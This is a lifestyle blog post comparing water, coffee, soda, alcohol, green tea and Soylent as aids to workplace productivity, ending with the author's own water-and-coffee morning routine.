There is one area of productivity “hacks” which appears to bring striking results, and it all comes down to what you drink whilst you work.
We all know it's important to stay hydrated, and many (myself included) love to fuel their brain with a steady influx of caffeine to keep them on track, but is that really the best option?
To answer this question, let's take a look at some of the biggest contenders for liquid productivity:
Water
Coffee
Soda
Alcohol
Green Tea
Soylent / Coffiest
Water Isn't the Be All and End All
First up, let's hit the basics. As I've said in the past, dehydration makes you unfocused, sluggish, irritable and can bring on one monster of a headache, but there is a myth which we need to lay to rest if we're to talk about why you need to be drinking more water.
You do not need to be drinking eight glasses of water per day.
Sure, you need to intake around 2.5 liters of water per day to stay hydrated and avoid any adverse effects, but the sources which reference this figure so many times have about as much weight as the latest “study” from a shampoo advert.
A significant chunk of your water intake will depend on what you eat and the other liquids you drink.
For example, if you have a slice of watermelon for breakfast then you're already well on your way to meet your quota.
Hell, even your morning coffee counts!

Couple this with the fact that your required intake will depend on your weight, how physical your work is, and the temperature of your environment, and it's just not realistic to give such a sweeping statement.
Instead, you need to apply some common sense; when you get up in the morning, try to make sure that a glass of juice or water is the first thing to go down the hatch to combat the morning grogginess.
After the initial cup, you should just be reaching out for your water when you're thirsty to enjoy anything up to a 14% increase in productivity.
My advice would be to have a bottle (or glass) of water on hand at all times so that you're not tempted to go without for the sake of staying on task.
Also, yes, you will probably be going to the bathroom more than you're used to, but the resulting payoff is worth it; better a clear head with bathroom breaks than a muggy mind that takes twice as long to work through a problem.
Coffee – Time it right with Moderation
Whilst I could wax lyrical about the wonders of black coffee, I'll stick to the facts for this one.
Coffee is a brilliant pick-me-up; it gives you a jolt of focus, at the cost of a later slump in productivity.
Not only that, but the more caffeine you ingest on a regular basis (coffee or otherwise), the more you will need just to function at your usual pace.
So, is this a bad thing? Should you be ditching your morning cuppa in favor of plain old water?
Well, not exactly.
Along with a host of potential health benefits, the burst of focus you can receive is highly beneficial in tasks which do not require a huge amount of creativity.
[av_promobox button='no' label='Click me' link='manually,http://' link_target=” color='theme-color' custom_bg='#444444′ custom_font='#ffffff' size='large' icon_select='no' icon='ue800′ font='entypo-fontello' box_color=” box_custom_font='#ffffff' box_custom_bg='#444444′ box_custom_border='#333333′]

For example, if you have an article researched and planned out, a coffee will serve to keep you on track as you write.
Whilst creative tasks (such as designing a new CTA) may be hindered by the extra focus, if you feel yourself losing the plot on a monotonous task then caffeine is your best bet to stay productive.
So, unlike with water consumption (whereby you should just drink when you're thirsty), how much coffee should you be taking to avoid the uncontrollable jitters?
Well, once again it will depend on how much caffeine you regularly intake.
Nonetheless, a single cup (90-200mg of caffeine) when your head needs a kick-start is a good way to start.
You also shouldn't be having more than two cups of coffee (400mg of caffeine) per day.
Soda – too many negatives
Soda is pretty much a worse version of coffee, at least in terms of productivity.
Whilst the average bottle of Coke (12 or 20 fluid ounces, depending on glass or plastic bottles) has less caffeine than a cup of coffee, the level of sugar involved will also result in any benefit from that caffeine being squandered, and the resulting crash much worse.
Much like coffee, any beneficial effects will also be lessened through regular use, to the point where the crash overtakes any potential high.
As Celestine Chua describes it, drinking soda can be likened to allowing your mind to work autonomously; “my conscious self is only allowed to observe in the background to give limited inputs”.
Essentially, even if we were to ignore the incredible number of sources citing the health issues associated with drinking soda regularly, there is next to no benefit to be gained which could not be better achieved with strategic use of coffee or tea.
Alcohol – Save it for After Work
It may seem like an odd choice to include alcohol in this list, but whilst going through the potential candidates it would be a shame to not reiterate the best take on the issue.
The deal with alcohol is this; no matter if you work in an office, a construction site or at home, leave the booze out of the equation (at least until you clock off for the day).
Whilst a 2012 study conducted by the University of Illinois suggested that a small level of alcohol may provide a temporary boost to productivity, the negatives associated with regular alcohol use (such as memory loss, poor coordination, slower reaction times and sleep disruption) far outweigh the positives.

Having said that, there is some evidence to suggest that working the morning after having a couple of drinks is no different than if you had stayed sober.
As long as you get enough sleep and don't drink so much that you have a splitting headache, you'll be just as productive as your teetotal colleagues.
Remember though – not while on duty.
Green Tea – Needs a Place in Your Cupboard
Green tea is also a contender, especially for those who are used to a cup or two of coffee per day.
It has a relatively mild amount of caffeine compared to coffee, along with the amino acid L-theanine (bear with me – I won't go full science). These combine to give you a productivity boost without the jitters or crash later in the day.
Put bluntly, if soda is all of the worst parts of coffee without the focus boost, green tea is the complete opposite.
The boost to your focus is not enough to dampen creativity, whilst the resulting slump is small enough to avoid derailing your train of thought.
Soylent / Coffiest – One to Look Out For
Soylent is one of those things you never thought you'd live to see; a powder-based food replacement with all of the nutrition the body needs.
What's not to love about this space-age drink which allows you to “get a balanced meal in less time than it takes to boil water or microwave a burrito”?
Well, perhaps unsurprisingly, it turns out that this is something best enjoyed in moderation.
Josh Helton decided to go 30 days without solid food in order to test how productive drinking Soylent could make him, and the results were… Interesting.
In general, think of going hardcore with Soylent like detoxing your entire body (except rather than getting rid of poisons, you're adjusting to a liquid diet).
The first week or so was the adjustment period for Josh, with lower energy levels and a worse mood than usual.
After this, however, things leveled out and his productivity levels saw an increase (both mentally and physically).

Once again, though, it's not advisable to completely eschew food in favor of Soylent for the sake of productivity.
Solid food can bring great pleasure, be it over the interaction with your significant other over dinner, or just tasting what's on your plate.
As Josh put it, “It boils down to what I value… I think I'll choose pleasure over productivity”.
Soylent have also released a new drink called Coffiest – a concoction which is designed to give you the equivalent of your breakfast and morning coffee in one bottle.
However, Coffiest also takes a leaf out of green tea's book by including L-theanine (the amino acid which cancels out the caffeine jitters).
Couple this with some pretty good reviews and the fact that I often skip breakfast anyway, and this is certainly a product to keep an eye out for.
What Works For Me From Experience
We all want to be more productive, but sometimes we can go a little too far to reach this goal.
Smoothies, energy drinks, filter coffee, instant coffee, breakfast tea, green tea, rose tea, you name it, I've tried it.
Whilst I've experimented with various drinks over the past year in the hopes that some magic tincture will spur me on to victory, the best result is significantly more boring than this sentence would suggest.
Every morning I'll get up, work the crick in my neck out, sit downstairs, then pour myself a glass of water and a thermos of coffee.
The water will go down first as I boot up my laptop and choose my focus music for the day.
Then I'll sip my coffee over the next half hour; a slow release of caffeine which wakes me up, but is spread out enough to avoid any significant crash in my productivity.
Now, whilst I'm a through-and-through coffee guy, I would strongly recommend trying out green tea instead if anyone fancies a change.
Not only is it generally more accepted to be beneficial to your health, but the combination of less caffeine and L-theanine works wonders for keeping you going during the afternoon.
I might even end up giving Coffiest a go in the future – a small part of me is still holding out for that miracle drink!
